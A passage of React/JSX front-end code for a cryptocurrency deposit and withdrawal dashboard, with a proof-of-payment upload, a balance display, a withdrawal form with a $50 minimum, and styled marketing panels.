                      </div>
                    ) : (
                      <div className="pointer-events-none flex flex-col items-center relative z-0">
                        <div className="w-16 h-16 bg-emerald-500/20 border border-emerald-500/30 rounded-full flex items-center justify-center mb-3">
                          <FileCheck2 size={28} className="text-emerald-400" />
                        </div>
                        <p className="text-sm font-bold text-emerald-400 truncate w-full px-4 tracking-wide">{proofFile.name}</p>
                        <p className="text-[10px] font-bold uppercase tracking-widest text-slate-400 mt-2">Click or drag to replace</p>
                      </div>
                    )}
                  </div>
                </div>

                <button
                  onClick={handleDeposit}
                  className="w-full py-5 bg-gradient-to-r from-emerald-500 to-emerald-400 text-white rounded-2xl font-black uppercase tracking-widest text-sm hover:from-emerald-400 hover:to-emerald-300 transition-all shadow-[0_0_30px_rgba(16,185,129,0.3)] transform hover:-translate-y-1"
                >
                  Authorize Injection
                </button>
              </div>
            </div>
            
            <div className="lg:col-span-5 h-full hidden lg:block">
              <div className="relative rounded-3xl overflow-hidden border border-slate-700/50 group h-full flex flex-col justify-end p-8">
                <div className="absolute inset-0 bg-slate-900 z-0" />
                <img src="https://images.unsplash.com/photo-1639762681485-074b7f4ec651?w=800&fit=crop" alt="Crypto Infrastructure" className="absolute inset-0 w-full h-full object-cover transform group-hover:scale-110 transition duration-1000 opacity-40 mix-blend-luminosity z-0" />
                <div className="absolute inset-0 bg-gradient-to-t from-[#070b14] via-[#070b14]/80 to-transparent z-10" />
                
                <div className="relative z-20">
                  <div className="w-12 h-12 bg-white/10 backdrop-blur-md border border-white/20 rounded-xl mb-6 flex items-center justify-center shadow-2xl">
                    <Activity size={24} className="text-emerald-400" />
                  </div>
                  <h3 className="text-3xl font-black font-serif text-white mb-4 tracking-tight drop-shadow-lg">Institutional Grade Settlement</h3>
                  <p className="text-slate-300 text-sm leading-relaxed mb-6 font-medium">
                    All client deposits are securely verified via cold-storage nodes. Once your on-chain transaction processes network confirmations, our automated API bridges your portfolio balance live.
                  </p>
                  
                  <div className="flex gap-4 items-center p-4 bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl">
                    <Clock className="text-amber-400" size={24} />
                    <div>
                      <p className="text-[10px] font-bold uppercase tracking-widest text-slate-400">Current network condition</p>
                      <p className="text-sm font-bold text-white">Optimal (Est. 5-15 mins)</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* TAB: Withdraw */}
        {activeTab === 'withdraw' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-2xl mx-auto">
            <div className="bg-slate-800/40 border border-slate-700/60 rounded-3xl p-8 lg:p-10 backdrop-blur-md shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/5 blur-3xl rounded-full -mr-20 -mt-20 pointer-events-none" />
              
              <h2 className="text-2xl font-black font-sans mb-8 flex items-center gap-3 text-white relative z-10">
                <div className="p-3 bg-amber-500/10 rounded-xl"><ArrowUpCircle size={24} className="text-amber-400" /></div>
                Capital Withdrawal
              </h2>

              <div className="mb-10 p-8 bg-slate-900 rounded-3xl border border-slate-800 flex justify-between items-center relative z-10 shadow-inner">
                <div>
                  <p className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">Unlocked Liquidity</p>
                  <p className="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">
                    ${(profile?.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </p>
                </div>
                <div className="w-16 h-16 bg-slate-800 border border-slate-700 rounded-full flex items-center justify-center">
                  <Wallet size={28} className="text-slate-400" />
                </div>
              </div>

              <div className="mb-10 relative z-10">
                <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">Target Withdrawal Size</label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-5 flex items-center pointer-events-none">
                    <span className="text-slate-400 font-bold">$</span>
                  </div>
                  <input
                    type="number"
                    value={withdrawAmount}
                    onChange={e => setWithdrawAmount(e.target.value)}
                    placeholder="Enter USD value"
                    min="50"
                    className="w-full pl-10 pr-6 py-4 bg-slate-900 border border-slate-700 rounded-2xl text-xl text-white font-black placeholder-slate-700 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all shadow-inner"
                  />
                  <button 
                    onClick={() => setWithdrawAmount(profile ? String(profile.balance) : '0')}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[10px] font-bold bg-amber-500/10 hover:bg-amber-500 text-amber-500 hover:text-slate-900 px-3 py-1.5 rounded-lg border border-amber-500/30 transition-all uppercase tracking-wider"
                  >
                    Max
                  </button>
                </div>
              </div>

              <div className="bg-[#0a0f1a] border border-slate-800 rounded-2xl p-6 mb-10 relative z-10">
                <div className="flex items-start gap-4">
                  <Clock size={24} className="text-amber-400 flex-shrink-0" />
                  <div>
                    <h4 className="text-sm font-bold text-slate-200 mb-1">Standard Processing Window</h4>
                    <p className="text-xs font-medium text-slate-500 leading-relaxed">
                      Withdrawals are routed through Institutional Security layers. Manual auditing is required. Funds will be dispersed to your whitelisted address off-chain within 1-24 hours. Minimum size is $50.00.
                    </p>
                  </div>
                </div>
              </div>

              <button
                onClick={handleWithdraw}
                className="w-full py-5 bg-gradient-to-r from-amber-500 to-amber-400 text-slate-900 rounded-2xl font-black uppercase tracking-widest text-sm hover:from-amber-400 hover:to-amber-300 transition-all shadow-[0_0_30px_rgba(245,158,11,0.2)] transform hover:-translate-y-1 relative z-10"
              >
                Execute Liquidity Extraction
              </button>
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
}

function LockIndicator() {
  return (
    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-slate-500">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
      <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
    </svg>
  );
}
